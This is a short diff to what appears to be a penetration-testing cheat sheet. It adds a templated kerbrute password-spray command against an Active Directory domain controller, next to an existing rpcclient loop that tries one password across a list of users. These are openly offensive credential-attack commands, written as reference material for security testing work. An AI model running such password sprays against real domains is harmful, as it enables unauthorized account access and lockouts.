@@ -1379,6 +1379,12 @@ https://github.com/ustayready/CredKing
 $ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 ```
 
+- Kerbrute Password Spray
+
+```
+$ kerbrute passwordspray -d <Domain Name> --dc <DC IP address> names.txt <password>
+```
+
 - Netexec
 
 ```
